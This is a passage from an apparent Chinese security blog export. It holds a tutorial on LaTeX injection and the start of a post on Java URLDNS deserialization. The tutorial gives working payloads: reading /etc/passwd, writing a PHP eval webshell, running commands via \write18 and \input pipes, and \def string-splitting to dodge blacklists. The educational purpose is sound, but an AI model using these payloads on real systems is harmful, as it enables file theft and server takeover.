class=\"keyword\">\\</span></span><br><span class=\"line\"><span class=\"keyword\"></span>makeindex,<span class=\"keyword\">\\</span></span><br><span class=\"line\"><span class=\"keyword\"></span>mpost,<span class=\"keyword\">\\</span></span><br><span class=\"line\"><span class=\"keyword\"></span>repstopdf,<span class=\"keyword\">\\</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>shell_escape</li>\n</ul>\n<blockquote>\n<p>f：不允许执行任何命令 t：允许执行任何命令 p：支持执行白名单内的命令(默认)</p>\n</blockquote>\n<p>命令行查看（需下载环境）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kpsewhich --var-value shell_escape</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209005-24.png\" alt=\"img\"></p>\n<ul>\n<li>shell_escape_commands</li>\n</ul>\n<blockquote>\n<p>白名单</p>\n</blockquote>\n<p>命令行查看（需下载环境）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kpsewhich --var-value shell_escape_commands</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-1.png\" alt=\"img\"></p>\n<p>尽管默认配置启用了白名单模式，但是还是存在被绕过的风险</p>\n<h1 id=\"0x02-LaTex环境\"><a href=\"#0x02-LaTex环境\" class=\"headerlink\" title=\"0x02 LaTex环境\"></a>0x02 LaTex环境</h1><ol>\n<li><h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3></li>\n</ol>\n<p>由于我并不经常使用 LaTex，所以我使用的是在线的编辑器，离线的大家可以自行安装，网上有比较详细的</p>\n<h5 id=\"https-www-papeeria-com\"><a href=\"#https-www-papeeria-com\" class=\"headerlink\" title=\"https://www.papeeria.com\"></a><a href=\"https://www.papeeria.com/\">https://www.papeeria.com</a></h5><p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-2.png\" alt=\"img\"></p>\n<ul>\n<li>点击 Live demo</li>\n</ul>\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-3.png\" alt=\"img\"></p>\n<ul>\n<li>点击 Sign Up 登录，我是谷歌账号一键登录了</li>\n</ul>\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-4.png\" alt=\"img\"></p>\n<ul>\n<li>写好代码然后点击编译就可以了（好像显示不了中文……）</li>\n</ul>\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-5.png\" alt=\"img\"></p>\n<p>（可以先去过一下基础的语法，这里不过多叙述）</p>\n<ol>\n<li><h3 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3></li>\n</ol>\n<h5 id=\"texlive\"><a href=\"#texlive\" class=\"headerlink\" title=\"texlive\"></a>texlive</h5><ul>\n<li>apt 一键安装环境</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install texlive</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-6.png\" alt=\"img\"></p>\n<ul>\n<li>写好代码</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">% demo.tex</span></span><br><span class=\"line\"><span class=\"keyword\">\\documentclass</span>&#123;article&#125;  </span><br><span class=\"line\"><span class=\"keyword\">\\begin</span>&#123;document&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\">LaTex injection demo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">\\end</span>&#123;document&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>pdflatex编译</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pdflatex demo.tex</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-7.png\" alt=\"img\"></p>\n<p>查看 demo.tex</p>\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-8.png\" alt=\"img\"></p>\n<h1 id=\"0x03-攻击方式\"><a href=\"#0x03-攻击方式\" class=\"headerlink\" title=\"0x03 攻击方式\"></a>0x03 攻击方式</h1><ol>\n<li><h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3></li>\n</ol>\n<p>有一篇文章：<a href=\"https://twitter.com/intigriti/status/1101509684614320130\">https://twitter.com/intigriti/status/1101509684614320130</a></p>\n<ul>\n<li>href，需要导入 hyperref 包，注意导入语句的位置，否则会报错</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\usepackage</span>&#123;hyperref&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\href</span>&#123;<span class=\"link\">javascript:alert(1)</span>&#125;&#123;xss&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-9.png\" alt=\"img\"></p>\n<p>应该是解析问题，href 生效了但是 alert 不出来……</p>\n<ul>\n<li>url，需要导入 url 包</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\usepackage</span>&#123;url&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\url</span>&#123;<span class=\"link\">javascript:alert(1)</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-10.png\" alt=\"img\"></p>\n<p>这个直接变成文字显示了……</p>\n<p>(失败的复现)</p>\n<ol>\n<li><h3 id=\"文件读写\"><a href=\"#文件读写\" class=\"headerlink\" title=\"文件读写\"></a>文件读写</h3></li>\n</ol>\n<ul>\n<li>input全文读取</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\input</span>&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-11.png\" alt=\"img\"></p>\n<ul>\n<li>读取一行</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\newread</span><span class=\"keyword\">\\file</span></span><br><span class=\"line\"><span class=\"keyword\">\\openin</span><span class=\"keyword\">\\file</span>=/etc/passwd</span><br><span class=\"line\"><span class=\"keyword\">\\read</span><span class=\"keyword\">\\file</span> to<span class=\"keyword\">\\line</span></span><br><span class=\"line\"><span class=\"keyword\">\\text</span>&#123;<span class=\"keyword\">\\line</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\closein</span><span class=\"keyword\">\\file</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-12.png\" alt=\"img\"></p>\n<ul>\n<li>循环读取多行</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\newread</span><span class=\"keyword\">\\file</span></span><br><span class=\"line\"><span class=\"keyword\">\\openin</span><span class=\"keyword\">\\file</span>=/etc/passwd</span><br><span class=\"line\"><span class=\"keyword\">\\loop</span><span class=\"keyword\">\\unless</span><span class=\"keyword\">\\ifeof</span><span class=\"keyword\">\\file</span>    <span class=\"comment\">% 循环开始的标记，会重复执行下面的代码，直到读取到文件末尾（EOF）为止</span></span><br><span class=\"line\">    <span class=\"keyword\">\\read</span><span class=\"keyword\">\\file</span> to<span class=\"keyword\">\\fileline</span></span><br><span class=\"line\">    <span class=\"keyword\">\\text</span>&#123;<span class=\"keyword\">\\fileline</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\repeat</span>                    <span class=\"comment\">% 循环的结束标记，表示要回到循环的开始处继续执行，除非已经达到文件末尾</span></span><br><span class=\"line\"><span class=\"keyword\">\\closein</span><span class=\"keyword\">\\file</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-13.png\" alt=\"img\"></p>\n<ul>\n<li>导入 verbatim 包读取</li>\n</ul>\n<p> verbatim 宏包用于在文档中显示原始的、未经处理的文本，包括特殊字符和空格</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\usepackage</span>&#123;verbatim&#125;    </span><br><span class=\"line\"><span class=\"keyword\">\\verbatiminput</span>&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-14.png\" alt=\"img\"></p>\n<ul>\n<li>导入 listings 包读取</li>\n</ul>\n<p>listings 宏包用于在文档中插入格式化的源代码，也可以读取并显示文件中的源代码</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\usepackage</span>&#123;listings&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\lstinputlisting</span>&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-15.png\" alt=\"img\"></p>\n<ul>\n<li>写入并读取</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\newwrite</span><span class=\"keyword\">\\outfile</span></span><br><span class=\"line\"><span class=\"keyword\">\\openout</span><span class=\"keyword\">\\outfile</span>=demo    </span><br><span class=\"line\"><span class=\"keyword\">\\write</span><span class=\"keyword\">\\outfile</span>&#123;write-file&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\closeout</span><span class=\"keyword\">\\outfile</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">\\input</span>&#123;demo&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-16.png\" alt=\"img\"></p>\n<ul>\n<li>写入并包含</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\newwrite</span><span class=\"keyword\">\\outfile</span></span><br><span class=\"line\"><span class=\"keyword\">\\openout</span><span class=\"keyword\">\\outfile</span>=demo    <span class=\"comment\">% 默认后缀.tex</span></span><br><span class=\"line\"><span class=\"keyword\">\\write</span><span class=\"keyword\">\\outfile</span>&#123;write-file&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\closeout</span><span class=\"keyword\">\\outfile</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">\\include</span>&#123;demo&#125;    <span class=\"comment\">% 可以包含tex后缀的文件</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-17.png\" alt=\"img\"></p>\n<ul>\n<li>写 webshell</li>\n</ul>\n<p>如果目标环境为 php，我们可以尝试 webshell 的写入</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\begin</span>&#123;filecontents*&#125;&#123;shell.php&#125;<span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"keyword\">\\end</span>&#123;filecontents*&#125;</span><br></pre></td></tr></table></figure>\n\n<p>\\begin{filecontents*} 用于在 LaTeX 源文件中创建和写入外部文件。它通常用于生成包含数据或代码的临时文件，以便在文档中进行引用或展示。而且 \\begin{filecontents*} 环境只能在导言区（preamble）中使用，并且应将其放置在 \\documentclass 命令之前，否则会产生报错</p>\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-18.png\" alt=\"img\"></p>\n<ol>\n<li><h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3></li>\n</ol>\n<ul>\n<li>\\write18</li>\n</ul>\n<p>LaTex 中执行命令的语法，但是由于 LaTeX 的延迟处理机制等问题，需要配合 \\immediate（立即执行）来使用</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\immediate</span><span class=\"keyword\">\\write</span>18&#123;whoami&#125;</span><br></pre></td></tr></table></figure>\n\n<p>但是无回显，还要配合文件读取输出执行结果</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\immediate</span><span class=\"keyword\">\\write</span>18&#123;whoami &gt; output&#125;</span><br><span class=\"line\"><span class=\"keyword\">\\input</span>&#123;output&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-19.png\" alt=\"img\"></p>\n<ul>\n<li>\\makeatletter &amp; \\makeatother</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\makeatletter</span><br><span class=\"line\">\\@@input|<span class=\"string\">&quot;whoami&quot;</span></span><br><span class=\"line\">\\makeatother</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-20.png\" alt=\"img\"></p>\n<p>\\makeatletter 和 \\makeatother 用于修改 @ 符号的分类码，当 @ 的分类码被设置为 “letter” 后，@@input 命令会被执行，因为 @@input 实际上是对内部命令 \\input 的调用。由于 @ 现在被视为普通字母字符，所以该命令变成了一个名为 @@input 的自定义命令</p>\n<ul>\n<li>如果 \\write 被过滤，我们还可以使用 \\input 配合管道符执行命令</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\input</span>|whoami</span><br><span class=\"line\"><span class=\"keyword\">\\input</span>|whoami|base64</span><br><span class=\"line\"><span class=\"keyword\">\\input</span>|&quot;whoami&quot;</span><br><span class=\"line\"><span class=\"keyword\">\\input</span>&#123;|whoami&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-21.png\" alt=\"img\"></p>\n<ul>\n<li>\\def 的利用</li>\n</ul>\n<p>其实就是一个定义变量的命令，可以用它来进行变量拼接字符串从而绕过黑名单</p>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\def</span> <span class=\"keyword\">\\a</span> &#123;<span class=\"keyword\">\\string</span>|who&#125;    <span class=\"comment\">% 值里有特殊字符的时候字符前需要加 \\string 转义</span></span><br><span class=\"line\"><span class=\"keyword\">\\def</span> <span class=\"keyword\">\\b</span> &#123;ami&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">\\input</span>&#123;<span class=\"keyword\">\\a</span><span class=\"keyword\">\\b</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-22.png\" alt=\"img\"></p>\n<ul>\n<li>实际情况中 LaTex 功能的插入一般只有一行，我们可以利用空格换行</li>\n</ul>\n<figure class=\"highlight latex\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\def</span> <span class=\"keyword\">\\a</span> &#123;<span class=\"keyword\">\\string</span>|who&#125; <span class=\"keyword\">\\def</span> <span class=\"keyword\">\\b</span> &#123;ami&#125; <span class=\"keyword\">\\input</span>&#123;<span class=\"keyword\">\\a</span><span class=\"keyword\">\\b</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-23.png\" alt=\"img\"></p>\n<p>而且这种单行输入好像并不支持循环语句</p>\n<h1 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h1><p>本来想和师傅们分享一下开头提到的两道 LaTex 相关的靶场和 CTF 题，但是 HTB 的就是一个简单的文件读取，而 Hackgame 的环境现在也已经打不开了，师傅们可以通过这篇 wp来观摩大佬的操作<a href=\"https://xz.aliyun.com/t/11809%EF%BC%8C%E7%84%B6%E5%90%8E%E6%88%91%E8%BF%99%E7%AF%87%E6%B6%89%E5%8F%8A%E7%9A%84%E5%86%85%E5%AE%B9%E6%AF%94%E8%BE%83%E5%9F%BA%E7%A1%80%EF%BC%8C%E4%B9%9F%E5%B8%8C%E6%9C%9B%E5%B8%88%E5%82%85%E4%BB%AC%E5%A4%9A%E5%A4%9A%E5%88%86%E4%BA%AB%E4%B8%80%E4%BA%9B%E8%BF%9B%E9%98%B6%E7%8E%A9%E6%B3%95%E8%AE%A9%E8%80%81%E5%BC%9F%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%EF%BC%8C%E4%B8%8E%E5%90%9B%E5%85%B1%E5%8B%89%EF%BC%81\">https://xz.aliyun.com/t/11809，然后我这篇涉及的内容比较基础，也希望师傅们多多分享一些进阶玩法让老弟学习学习，与君共勉！</a></p>\n<p>References：</p>\n<ul>\n<li><a href=\"https://oi-wiki.org/tools/latex\">https://oi-wiki.org/tools/latex</a></li>\n<li><a href=\"https://www.freebuf.com/articles/security-management/308191.html\">https://www.freebuf.com/articles/security-management/308191.html</a></li>\n<li><a href=\"https://blog.noah.360.net/tex-restricted-mode-bypass\">https://blog.noah.360.net/tex-restricted-mode-bypass</a></li>\n<li><a href=\"https://xz.aliyun.com/t/11809#toc-4\">https://xz.aliyun.com/t/11809#toc-4</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection\">https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection</a></li>\n</ul>\n","categories":["WEB安全"],"tags":["LaTex"]},{"title":"Java反序列化之URLDNS从0到1","url":"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>之前对java反序列化漏洞一直都是停留在poc或者工具利用的阶段，最近决定想深究一下其中的原理，自我提升一下，本篇围绕URLDNS利用链，记录一下学习过程。 </p>\n<span id=\"more\"></span>\n\n<h1 id=\"0x01-基础知识\"><a href=\"#0x01-基础知识\" class=\"headerlink\" title=\"0x01 基础知识\"></a>0x01 基础知识</h1><h3 id=\"1-1-Java反射\"><a href=\"#1-1-Java反射\" class=\"headerlink\" title=\"1.1 Java反射\"></a>1.1 Java反射</h3><p>Java的反射机制可以在运行时动态地获取类的信息、调用对象的方法、访问或修改对象的属性，而不需要在编译时就确定这些操作。通过使用反射，可以在运行时检查类、实例化对象、调用方法和访问字段，从而实现代码的动态性和灵活性。</p>\n<p>要使用反射，需要引入 java.lang.reflect 包。下面是一些常用的反射方法：</p>\n<p>1.1.1 获取 Class 对象</p>\n<ul>\n<li>通过类名获取 Class 对象：Class&lt;?&gt; cls &#x3D; Class.forName(“com.example.MyClass”);</li>\n<li>通过实例对象获取 Class 对象：Class&lt;?&gt; cls &#x3D; obj.getClass();</li>\n</ul>\n<p>1.1.2 创建对象</p>\n<ul>\n<li>通过无参构造函数创建对象：Object obj &#x3D; cls.newInstance();</li>\n<li>通过有参构造函数创建对象：首先获取相应的构造函数对象，然后调用 newInstance() 方法。</li>\n</ul>\n<p>1.1.3 访问字段</p>\n<ul>\n<li>获取字段对象：Field field &#x3D; cls.getDeclaredField(“fieldName”);</li>\n<li>设置字段的值：field.set(obj, value);</li>\n<li>获取字段的值：Object value &#x3D; field.get(obj);</li>\n</ul>\n<p>1.1.4 调用方法</p>\n<ul>\n<li>获取方法对象：Method method &#x3D; cls.getDeclaredMethod(“methodName”, argTypes);</li>\n<li>调用静态方法：method.invoke(null, args);</li>\n<li>调用实例方法：method.invoke(obj, args);</li>\n</ul>\n<p>1.1.5 修改访问权限</p>\n<ul>\n<li>设置字段或方法的可访问性（用于访问私有方法或属性）：field.setAccessible(true); 或 method.setAccessible(true);</li>\n</ul>\n<p>一个简单的反射示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//通过Constructor类，可以获取类构造函数以创建类的实例</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//通过Field类，可以访问和修改类的字段的值</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//通过Method类的invoke方法，可以调用类的方法</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">User</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = <span class=\"string\">&quot;YDJ&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">Getname</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;user is &quot;</span>+name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ReflectionDemo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 获取类的信息</span></span><br><span class=\"line\">        Class&lt;?&gt; user = User.class;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 获取构造函数并创建实例</span></span><br><span class=\"line\">        Constructor&lt;?&gt; constructor = user.getConstructor();</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">userobject</span> <span class=\"operator\">=</span> constructor.newInstance();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 调用方法</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">method1</span> <span class=\"operator\">=</span> user.getDeclaredMethod(<span class=\"string\">&quot;Getname&quot;</span>);</span><br><span class=\"line\">        method1.invoke(userobject);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 访问和修改字段的值</span></span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> user.getDeclaredField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//设置类中私有属性为可访问</span></span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(userobject, <span class=\"string\">&quot;admin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 调用方法</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">method2</span> <span class=\"operator\">=</span> user.getDeclaredMethod(<span class=\"string\">&quot;Getname&quot;</span>);</span><br><span class=\"line\">        method2.invoke(userobject);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671522-19.png\" alt=\"img\"></p>\n<h1 id=\"0x02-漏洞原理\"><a href=\"#0x02-漏洞原理\" class=\"headerlink\" title=\"0x02 漏洞原理\"></a>0x02 漏洞原理</h1><h3 id=\"2-1-Java序列化与反序列化\"><a href=\"#2-1-Java序列化与反序列化\" class=\"headerlink\" title=\"2.1 Java序列化与反序列化\"></a>2.1 Java序列化与反序列化</h3><p>为了方便对象的存储和传输，序列化应需而生。Java序列化是将Java对象转换成字节流的过程。反序列化则是通过读取字节流并将其解析为对象的过程。</p>\n<p>序列化需要遵循以下原则  ：</p>\n<ul>\n<li>首先，要将要序列化的Java类实现Serializable接口。该接口没有任何方法，只是为了标识类已经准备好进行序列化</li>\n<li>使用ObjectOutputStream对象将Java对象序列化为字节流。如果需要将其写入文件，可以使用FileOutputStream将数据写入文件中</li>\n</ul>\n<p>在原生Java中，分别使用wirteObject与readObject进行序列化与反序列化，下面是一个简单的示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SerializationDemo</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 用户类，实现 Serializable 接口</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">User</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">1L</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"type\">int</span> age;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"title function_\">User</span><span class=\"params\">(String name, <span class=\"type\">int</span> age)</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getAge</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> age;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">User</span> <span class=\"variable\">user</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">User</span>(<span class=\"string\">&quot;YDJ&quot;</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 序列化</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> (<span class=\"type\">FileOutputStream</span> <span class=\"variable\">fileOut</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;user.ser&quot;</span>);</span><br><span class=\"line\">             <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOut</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(fileOut)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            objectOut.writeObject(user);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;user对象已成功序列化到文件&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">            ex.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 反序列化</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> (<span class=\"type\">FileInputStream</span> <span class=\"variable\">fileIn</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;user.ser&quot;</span>);</span><br><span class=\"line\">             <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">objectIn</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(fileIn)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"type\">User</span> <span class=\"variable\">deserializedUser</span> <span class=\"operator\">=</span> (User) objectIn.readObject();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;从文件中反序列化user对象：&quot;</span>);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;name：&quot;</span> + deserializedUser.getName());</span><br><span class=\"line\">            System.out.println(<span 